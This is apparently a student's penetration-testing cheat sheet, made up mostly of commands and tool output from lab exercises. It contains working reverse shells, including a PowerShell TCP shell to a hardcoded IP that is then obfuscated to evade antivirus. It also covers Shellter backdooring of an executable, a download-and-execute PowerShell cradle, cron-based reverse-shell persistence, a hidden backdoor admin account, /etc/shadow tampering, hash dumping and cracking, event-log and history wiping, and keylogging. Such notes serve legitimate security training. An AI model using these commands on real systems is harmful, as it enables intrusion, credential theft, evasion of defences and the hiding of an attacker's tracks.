# Index
- [SECTION 3 Host and Network Penetration Testing](#SECTION-3-Host-and-Network-Penetration-Testing)
  - System and Host Based Attacks
  - [Network-Based Attacks](#Network-Based-Attacks)
  - The Metasploit Framework (MSF)
  - [Exploitation](#Exploitation)
  - [Post-Exploitation](#Post-Exploitation)
  - Social Engineering

# SECTION 3 Host and Network Penetration Testing

## System and Host Based Attacks

## Network-Based Attacks
### ARP Poisoning
```
ip a

nmap <subnet>
- 10.100.13.36 server
- 10.100.13.37 client

echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward

arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
8:0:27:d4:ee:5d 8:0:27:99:aa:a7 0806 42: arp reply 10.100.13.36 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:4a:45:f3 0806 42: arp reply 10.100.13.37 is-at 8:0:27:d4:ee:5d

sudo wireshark -i eth1 -k
```

## The Metasploit Framework (MSF)

## Exploitation
- [Vulnerability Scanning](#Vulnerability-Scanning)
- [Searching For Exploits](#Searching-For-Exploits)
- [Fixing Exploits](#Fixing-Exploits)
- [Bind and Reverse Shells](#Bind-and-Reverse-Shells)
- [Exploitation Frameworks](#Exploitation-Frameworks)
- [Windows Exploitation](#Windows-Exploitation)
- [Linux Exploitation](#Linux-Exploitation)
- [AV Evasion & Obfuscation](#AV-Evasion-&-Obfuscation)

### Vulnerability Scanning

### Searching For Exploits

### Fixing Exploits
```
searchsploit rejetto 2.3
searchsploit -m 39161

cd ~/Desktop
cp /usr/share/windows-resources/binaries/nc.exe ./
python -m SimpleHTTPServer 80

nc -nvlp <port>

vi 39161.py
Change ip_addr and local_port accordingly for nc listener
python 39161.py <ip> <port>
```

#### Windows Cross-Compilation Example
```
sudo apt-get install mingw-w64 gcc

searchsploit -m 9303

Compiling 64-bit version:
i686-w64-mingw32-gcc 9303.c -o exploit
--> -rwxr-xr-x 1 kali kali 230609 Jan  5 00:49 exploit.exe

file exploit.exe
exploit.exe: PE32 executable (console) Intel 80386, for MS Windows, 17 sections

Compiling 32-bit version:
i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
--> -rwxr-xr-x 1 kali kali 230609 Jan  5 00:51 exploit_32.exe

file exploit_32.exe 
exploit_32.exe: PE32 executable (console) Intel 80386, for MS Windows, 17 sections
```
- Use 32-bit if unsure of target's architecture.

#### Linux Compilation Example
```
searchsploit -m 40839

gcc -pthread 40839.c -o dirty -lcrypt
--> -rwxr-xr-x 1 kali kali 17512 Jan  5 00:56 dirty

file dirty         
dirty: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=831f9c59a2d3c829841c3f34979bd09c94104b21, for GNU/Linux 3.2.0, not stripped
```  
- Specific compilation instructions given.

#### Useful Links
- https://gitlab.com/exploit-database/exploitdb-bin-sploits

### Bind and Reverse Shells
```
nc -help

-n : do not resolve hostnames
-v : verbosity, can be used multiple times
-l : listen
-p : local port number
-u : UDP instead of TCP
-e : execute command
```

```
cd /usr/share/windows-resources/binaries/
python -m SimpleHTTPServer 80

certutil -urlcache -f http://<ip>/nc.exe nc.exe
nc.exe -h
```
- Windows does not have `netcat` by default.

#### Transferring Files
```
nc -nvlp <port> > received.txt
nc -nv <ip> <port> < sent.txt
```

#### Bind Shells
```
nc -nvlp <port> -e /bin/bash
nc -nv <ip> <port>
```
```
nc -nvlp <port> -e cmd.exe
nc -nv <ip> <port>
```

#### Reverse Shells
```
nc -nvlp <port>
nc -nv <ip> <port> -e /bin/bash
```
```
nc -nvlp <port>
nc -nv <ip> <port> -e cmd.exe
```
```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

#### Useful Links
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://www.revshells.com/

### Exploitation Frameworks
#### MSF
```
nmap -Pn -sV <ip>

searchsploit process maker

search processmaker
use exploit/multi/http/processmaker_plugin_upload
use exploit/multi/http/processmaker_exec
```
- Both modules require credentials - default credentials are `admin / admin`.

#### PowerShell-Empire (Empire)
```
sudo apt-get update && sudo apt-get install powershell-empire starkiller -y

sudo powershell-empire server

sudo powershell-empire client
listeners
agents

https://localhost:1337
empireadmin / password123
```
- https://www.kali.org/blog/empire-starkiller/ (Web GUI)

### Windows Exploitation

### Linux Exploitation

### AV Evasion & Obfuscation
- https://www.shellterproject.com/

```
sudo apt install shellter -y
```
- Shellter is a Windows executable, need Wine (https://www.winehq.org/) which is a compatibility layer for running Windows software on Unix-like systems.

```
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32 -y
```

```
mkdir ~/Desktop/AVBypass
cp /usr/share/windows-resources/binaries/vncviewer.exe ~/Desktop/AVBypass/vncviewer.exe

cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```
- After execution, a backup of the original PE is stored in `/usr/share/windows-resources/shellter/Shellter_Backups`.
- Select Stealth mode - `vncviewer.exe` will function normally.

- https://github.com/danielbohannon/Invoke-Obfuscation

```
cd ~/Desktop/AVBypass
git clone https://github.com/danielbohannon/Invoke-Obfuscation

sudo apt install powershell -y
```

```
$client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- https://github.com/swisskyrepo/PayloadsAllTheThings
- Remove `powershell -nop -c` and double-quotes `"`.
- Save as `shell.ps1`.

```
pwsh
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
ENCODING
1
```

```
InvOKE-EXprESSION ([StRIng]::jOiN('', ( '36r99S108F105-101y110&116J32F61S32U78y101-119r45-79l98S106S101F99t116t32y83&121F115y116U101l109r46S78&101U116l46t83F111l99F107F101F116F115l46F84U67y80-67r108J105J101y110S116S40t39l49y48r46F48l46&50y46r49U53U39F44&49t50y51t52t41-59y36-115U116&114l101l97F109r32U61F32U36-99-108U105U101r110y116t46l71r101l116F83&116y114y101J97&109S40t41-59&91r98l121F116F101y91S93S93U36U98r121t116U101t115J32y61r32t48J46S46U54l53U53F51J53S124y37t123y48&125J59U119r104&105F108t101&40J40t36U105S32t61F32S36J115l116J114J101F97U109l46r82F101&97J100-40-36t98l121t116F101t115-44l32r48y44&32y36-98y121U116y101-115J46y76l101F110y103&116r104t41S41&32l45F110S101&32y48&41t123&59y36S100y97S116y97J32y61F32F40l78&101J119t45r79l98t106l101y99J116-32F45J84l121S112F101F78-97F109J101S32F83U121U115F116l101F109F46S84S101F120U116&46y65S83l67S73&73-69&110F99y111t100S105y110&103y41U46U71-101U116F83t116U114y105-110U103&40t36-98r121U116&101&115U44t48l44&32-36U105S41y59r36&115t101J110y100U98y97U99S107l32F61-32J40t105S101&120l32y36y100S97l116S97U32J50F62r38S49J32&124y32r79F117U116-45l83l116y114S105y110S103l32U41&59F36&115J101y110l100-98-97S99l107J50F32t61&32l36U115l101l110r100F98S97-99U107&32S43t32J39U80y83&32F39S32-43S32r40l112F119l100S41t46t80J97&116-104&32J43J32S39t62y32-39&59y36y115r101&110t100-98S121&116y101-32J61F32r40y91F116-101l120y116l46U101l110r99S111t100t105J110S103&93U58t58t65y83U67y73&73y41-46r71F101&116J66y121t116-101F115r40U36&115&101U110t100y98&97S99r107t50S41-59U36S115J116t114&101y97U109F46t87-114r105l116r101&40&36J115-101r110y100t98t121S116-101-44t48y44r36S115l101l110l100l98r121F116J101S46&76&101y110y103F116F104&41t59l36F115S116t114U101l97J109-46&70y108S117t115r104&40F41U125U59l36r99U108l105F101l110&116l46-67t108l111r115S101r40U41r10'.SpLIt( 'FSl-JUryt&' ) | fOREaCh{( [CHAR][iNt] $_)} )) ) 
```

```
BACK

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
AST
ALL
1
```

```
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.2.15',1234));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Post-Exploitation
- [Windows Local Enumeration](#Windows-Local-Enumeration)
- [Linux Local Enumeration](#Linux-Local-Enumeration)
- [Transferring Files To Windows and Linux Targets](#Transferring-Files-To-Windows-and-Linux-Targets)
- [Upgrading Shells](#Upgrading-Shells)
- [Windows Privilege Escalation](#Windows-Privilege-Escalation)
- [Linux Privilege Escalation](#Linux-Privilege-Escalation)
- [Windows Persistence](#Windows-Persistence)
- [Linux Persistence](#Linux-Persistence)
- [Dumping and Cracking Windows Hashes](#Dumping-and-Cracking-Windows-Hashes)
- [Dumping and Cracking Linux Hashes](#Dumping-and-Cracking-Linux-Hashes)
- [Pivoting](#Pivoting)
- [Clearing Your Tracks](#Clearing-Your-Tracks)
- [Keylogging](#Keylogging)

### Windows Local Enumeration
#### Enumerating System Information
```
meterpreter > sysinfo

hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
dir /b/s eula.txt
```

#### Enumerating Users & Groups
```
meterpreter > getuid
meterpreter > getprivs

whoami
whoami /priv
query user
net users
net user <username>
net localgroup
net localgroup <group>
net localgroup Administrators

use post/windows/gather/enum_logged_on_users
set SESSION <session_id>
```

#### Enumerating Network Information
```
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles
```
- Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output.

#### Enumerating Processes & Services
```
meterpreter > ps
meterpreter > ps -S <process_name>
meterpreter > pgrep <process_name>

net start
wmic service list brief
tasklist
tasklist /SVC

mkdir C:\Temp
schtasks /query /fo LIST /v > C:\Temp\schtasks.txt
exit

meterpreter > download C:\\Temp\\schtasks.txt
```

#### Automating Windows Local Enumeration
```
meterpreter > show_mount

use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/gather/enum_computers
use post/windows/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.

#### JAWS - Just Another Windows Script
```
meterpreter > mkdir C:\\Temp
meterpreter > cd C:\\Temp
meterpreter > upload /root/jaws-enum.ps1
meterpreter > shell

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
exit

meterpreter > download C:\\Temp\\jaws-enum.txt
```
- https://github.com/411Hall/JAWS

### Linux Local Enumeration
#### Enumerating System Information
```
meterpreter > sysinfo

hostname
cat /etc/issue && cat /etc/*release
uname -a
uname -r
env
lscpu
free -h
df -h
lsblk
dpkg -l
cat /etc/shells
```

#### Enumerating Users & Groups
```
meterpreter > getuid

id
cat /etc/passwd
ls -l /home
groups
groups <username>
who
w
last
lastlog
```
- `uid=0` is root.

#### Enumerating Network Information
```
meterpreter > ifconfig
meterpreter > netstat
meterpreter > route
meterpreter > arp

ip a s
arp -a
cat /etc/networks
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
```

#### Enumerating Processes & Cron Jobs
```
meterpreter > ps
meterpreter > ps -S <process_name>
meterpreter > pgrep <process_name>

ps --help all
ps
ps aux
ps aux | grep root
ps aux | grep <process_name>
ps aux | grep -i <keyword>
top
crontab -l
crontab -l -u <username>
ls -al /etc/cron*
cat /etc/crontab
cat /etc/cron*
```

#### Automating Linux Local Enumeration 
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system  
use post/linux/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.

#### LinEnum
```
meterpreter > cd /tmp
meterpreter > upload /root/linenum.sh
meterpreter > ls
meterpreter > shell

/bin/bash -i
chmod +x linenum.sh
./linenum.sh
```
- https://github.com/rebootuser/LinEnum

### Transferring Files To Windows and Linux Targets
#### Setting Up A Web Server With Python
```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```

#### Transferring Files to Windows Targets
```
mkdir C:\Temp
cd C:\Temp
certutil -urlcache -f http://<ip>/<filename> <filename>
```

#### Transferring Files to Linux Targets
```
cd /tmp
wget http://<ip>/<filename>
```

### Upgrading Shells
#### Bash
```
cat /etc/shells
/bin/bash -i
```

#### Python
```
which python python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Magic
```
which python python3
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z

echo $TERM
stty -a
stty raw -echo
fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <no_of_rows> columns <no_of_columns>
```

#### Upgrade to Meterpreter Shell
```
sessions -u <session_id>
```
```
use post/multi/manage/shell_to_meterpreter
set LHOST <ip>
set SESSION <session_id>
set WIN_TRANSFER VBS
```

### Windows Privilege Escalation
```
use exploit/multi/script/web_delivery
set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
set LHOST <ip>

powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\oPY153Pv.exe')"; (new-object System.Net.WebClient).DownloadFile('http://<ip>:<port>/5YaTnDgYGm1KPK', $z); invoke-item $z
```
-  Listens on `8080` (Web) and `4444` (shell) by default after running `exploit`. Run generated PowerShell code on target to get a shell.

#### PrivescCheck
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
- https://github.com/itm4n/PrivescCheck

#### psexec
```
which psexec.py
psexec.py <username>@<ip>
```
```
use exploit/windows/smb/psexec
set SMBUser <username>
set SMBPass <password>
```

#### MSHTA
```
runas.exe /user:<username> cmd

use exploit/windows/misc/hta_server
exploit

mshta.exe http://<ip>:<port>/<filename>.hta
```

### Linux Privilege Escalation
#### Files With Weak Permissions
```
find / -not -type l -perm -o+w

ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 551 Jan  3 15:31 /etc/shadow
```
- `-o+w` means others have write permissions.

```
openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/

vi /etc/shadow
root:*:17764:0:99999:7::: --> root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::

su
Password: password
```
- Modify `/etc/shadow` by setting root password.

#### Sudo Privileges
```
sudo -l
User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man
```
```
sudo man man
!/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```
- Press `!`, then type `/bin/sh`.

#### SUID Binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

#### Useful Links
- https://gtfobins.github.io/

### Windows Persistence
#### Persistence Via Services
```
use exploit/windows/local/persistence_service
set SESSION <session_id>
set LPORT <port>
```
- Admin or system privilege is required.
- Change `LPORT` to prevent conflict with existing session(s).
- Retries every 5 seconds.

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
```

#### Persistence Via RDP
```
meterpreter > run getgui -e -u hackersploit -p hacker_123321

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	Terminal Services service is already set to auto
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: hackersploit with Password: hacker_123321
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: hackersploit to local group 'Remote Desktop Users'
[*] 	Adding User: hackersploit to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20240104.1828.rc
```
- Creates a backdoor user account.
- Password must meet complexity requirements.

```
xfreerdp /u:hackersploit /p:hacker_123321 /v:<ip>
```

### Linux Persistence
#### Persistence Via SSH Keys
```
ssh <username>@<ip>
cat .ssh/id_rsa

scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
chmod 400 id_rsa
ssh -i id_rsa <username>@<ip>
```

#### Persistence Via Cron Jobs
```
ps -ef | grep cron

cat /etc/cron*

ls -al /etc/crontab
-rw-r--r-- 1 root root 722 Nov 16  2017 /etc/crontab

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron

crontab -i cron
crontab -l

cat /etc/crontab
ls -al /etc/cron*

nc -nvlp 1234
```
```
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
```

### Dumping and Cracking Windows Hashes
#### John the Ripper
```
meterpreter > ps -S lsass.exe
meterpreter > migrate <pid>

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
- Hashes will appear in `creds`.

```
vi hashes.txt

Paste Administrator and bob's hashes into the text file

john --format=NT hashes.txt

cat .john/john.pot

rm -rf /root/.john
john --format=NT hashes.txt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
- Default wordlist `/usr/share/john/password.lst`.

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```
- Alternative wordlist.

```
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

#### Hashcat
```
hashcat --help

hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt

cat .hashcat/hashcat.potfile
```

### Dumping and Cracking Linux Hashes
- Need privileges to access `/etc/shadow`
	- $1 - MD5 (weakest)
	- $2 - Blowfish
	- $5 - SHA-256
	- $6 - SHA-512

```
meterpreter > cat /etc/shadow
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
```
- Unable to use `hashdump` for Linux?

#### John the Ripper
```
use post/linux/gather/hashdump
set SESSION <session_id>

creds
loot

cat /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash

gzip -d /usr/share/wordlists/rockyou.txt.gz

john --format=sha512crypt /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt --wordlist=/usr/share/wordlists/rockyou.txt

cat .john/john.pot
```
- Must use the unshadowed password file.

```
use auxiliary/analyze/crack_linux
set SHA512 true
```

#### Hashcat
```
hashcat -m 1800 -a 3 /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt /usr/share/wordlists/rockyou.txt

cat .hashcat/hashcat.potfile
```

### Pivoting
```
meterpreter > ipconfig
meterpreter > arp
```
- Target only has one interface.
- `arp` shows the presence of other systems that we cannot reach (ping).

```
meterpreter > run autoroute -s <subnet>
meterpreter > run autoroute -p
```
- Use CIDR notation e.g. `10.0.16.0/20`.

```
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip2>
```
- `<ip2>` is target 2.

```
meterpreter > portfwd add -l <local_port> -p <remote_port> -r <ip2>
meterpreter > portfwd list
```

```
netstat -an | grep LISTEN

nmap -Pn -sV -p<local_port> localhost
```

```
use exploit/windows/http/badblue_passthru
set RHOSTS <ip2>
set payload windows/meterpreter/bind_tcp
```
- Need `bind_tcp` because target 1 cannot forward reverse connections back to Kali.
- `LPORT` here will be the port that target 2 listens on.

### Clearing Your Tracks
#### Clearing Your Tracks On Windows
```
show advanced
```
- Options may be relevant.

```
mkdir C:\Temp
cd C:\Temp
```
- Always use `C:\Temp`.

```
use exploit/windows/local/persistence_service
set SESSION <session_id>
set LPORT 4433

[*] Started reverse TCP handler on 10.10.16.2:4433 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vRMPV.exe
[*] Creating service oJOjN
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc
[*] Sending stage (175174 bytes) to 10.0.20.54
[*] Meterpreter session 2 opened (10.10.16.2:4433 -> 10.0.20.54:49737) at 2024-01-04 15:22:04 +0530
```
- Some modules have a cleanup file.

```
cat /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc

execute -H -f sc.exe -a "stop oJOjN"
execute -H -f sc.exe -a "delete oJOjN"
execute -H -i -f taskkill.exe -a "/f /im vRMPV.exe"
rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vRMPV.exe"
```

```
meterpreter > resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc

[*] Processing /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc for ERB directives.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> execute -H -f sc.exe -a "stop oJOjN"
Process 3356 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> execute -H -f sc.exe -a "delete oJOjN"
Process 2792 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> execute -H -i -f taskkill.exe -a "/f /im vRMPV.exe"
Process 1012 created.
Channel 2 created.
SUCCESS: The process "vRMPV.exe" with PID 3024 has been terminated.
SUCCESS: The process "vRMPV.exe" with PID 2824 has been terminated.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vRMPV.exe"
```

#### Cleaning Event Logs
```
meterpreter > clearev

[*] Wiping 159 records from Application...
[*] Wiping 759 records from System...
[*] Wiping 2571 records from Security...
```
- Avoid using this during an engagement.

#### Clearing Your Tracks On Linux
```
cd /tmp
```
- Always use `/tmp`.

```
cat /dev/null > ~/.bash_history
history -c
```

### Keylogging
```
meterpreter > getdesktop
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
- https://www.offsec.com/metasploit-unleashed/keylogging/

## Social Engineering
- NULL
